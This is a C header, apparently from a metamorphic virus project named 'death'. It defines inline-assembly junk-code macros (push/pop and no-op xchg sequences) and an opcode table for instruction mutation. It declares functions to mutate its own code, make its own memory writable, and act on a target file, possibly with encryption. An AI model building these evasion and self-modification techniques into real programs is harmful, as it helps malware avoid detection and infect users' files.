#ifndef DEATH_H
#define DEATH_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

typedef struct file_s file_t;
typedef struct saved_vars_s saved_vars_t;
#define NB_JUNK_MAX 500

#define RAND_SIZE 4096

#define B_PUSH_RAX ".byte 0x50\n\t"			// push rax
#define B_PUSH_RBX ".byte 0x53\n\t"			// push rbx
#define B_POP_RAX ".byte 0x58\n\t"			// pop rax
#define B_POP_RBX ".byte 0x5b\n\t"			// pop rbx
#define B_NOP ".byte 0x48,0x87,0xc0\n\t"	// REX.W xchg rax,rax

#define PUSH_OP		0x50
#define PUSH_RBX	0x53

#define POP_OP		0x58
#define POP_RBX		0x5b
#define NOP_OP		0x90
#define OP_64		0x48
#define XCHG		0x87
#define RAX_RAX		0xC0

//#define NOPS_LEN 9
//#define JUNK_LEN 4 + NOPS_LEN
//#define MAX_INSTR 4 + NOPS_LEN
#define NOPS_LEN 27
#define JUNK_LEN 4 + NOPS_LEN
#define MAX_INSTR JUNK_LEN
#define JUNK __asm__ __volatile__ ( \
		B_PUSH_RAX					\
		B_PUSH_RBX 					\
		B_NOP						\
		B_NOP						\
		B_NOP						\
		B_NOP						\
		B_NOP						\
		B_NOP						\
		B_NOP						\
		B_NOP						\
		B_NOP						\
		B_POP_RBX 					\
		B_POP_RAX 					\
)

enum e_opcode {

	OPCODE_XCHG  = 0x87,
	OPCODE_MOV   = 0x8B,
	//OPCODE_MOVSX = 0x63,

	OPCODE_ADD_RM_R = 0x01,
	OPCODE_ADD_R_RM = 0x03,

	OPCODE_SUB_RM_R = 0x29,
	OPCODE_SUB_R_RM = 0x2B,

	OPCODE_ADC  = 0x11,
	OPCODE_SBB  = 0x19,
	OPCODE_ADD  = 0x83,

	OPCODE_AND  = 0x21,
	OPCODE_OR   = 0x09,
	OPCODE_XOR  = 0x31,
	OPCODE_TEST = 0x85,
	OPCODE_CMP  = 0x39,

	OPCODE_SHL  = 0xD3,
};


void	prepare_mutate(void);
void	mutate(void);
int make_writeable(uint8_t *self, size_t size);
//int	death(int start_offset, int64_t key, file_t *file);
//int	death(int start_offset, uint8_t *key, file_t *file, bool is_encrypted);
int	death(saved_vars_t *saved_vars, file_t *file);

#endif
